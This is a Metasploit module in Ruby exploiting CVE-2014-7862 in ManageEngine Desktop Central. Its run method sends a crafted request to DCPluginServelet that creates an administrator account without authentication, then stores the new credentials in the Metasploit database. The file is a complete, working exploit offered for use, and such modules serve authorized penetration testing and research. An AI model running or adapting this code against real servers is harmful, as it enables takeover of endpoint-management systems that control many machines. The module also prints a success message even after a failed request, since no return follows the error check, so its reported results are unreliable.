##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'ManageEngine Desktop Central Administrator Account Creation',
      'Description'  => %q{
        This module exploits an administrator account creation vulnerability in Desktop Central
        from v7 onwards by sending a crafted request to DCPluginServelet. It has been tested in
        several versions of Desktop Central (including MSP) from v7 onwards.
      },
      'Author'       =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          ['CVE', '2014-7862'],
          ['OSVDB', '116554'],
          ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/2'],
          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_dc9_admin.txt'],
        ],
      'DisclosureDate' => 'Dec 31 2014'))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8020]),
        OptString.new('TARGETURI', [ true,  'ManageEngine Desktop Central URI', '/']),
        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),
        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),
        OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
      ])
  end


  def run
    # Generate password hash
    salt = Time.now.to_i.to_s
    password_encoded = Rex::Text.encode_base64([Rex::Text.md5(datastore['PASSWORD'] + salt)].pack('H*'))

    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.path, "/servlets/DCPluginServelet"),
      'method'   =>'GET',
      'vars_get' => {
        'action'      => 'addPlugInUser',
        'role'        => 'DCAdmin',
        'userName'    => datastore['USERNAME'],
        'email'       => datastore['EMAIL'],
        'phNumber'    => Rex::Text.rand_text_numeric(6),
        'password'    => password_encoded,
        'salt'        => salt,
        'createdtime' => salt
      }
    })

    # Yes, "sucess" is really mispelt, as is "Servelet" ... !
    unless res && res.code == 200 && res.body && res.body.to_s =~ /sucess/
      print_error("Administrator account creation failed")
    end

    print_good("Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
    service_data = {
      address: rhost,
      port: rport,
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      private_type: :password,
      private_data: datastore['PASSWORD'],
      username: datastore['USERNAME']
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)
    login_data = {
      core: credential_core,
      access_level: 'Administrator',
      status: Metasploit::Model::Login::Status::UNTRIED
    }
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
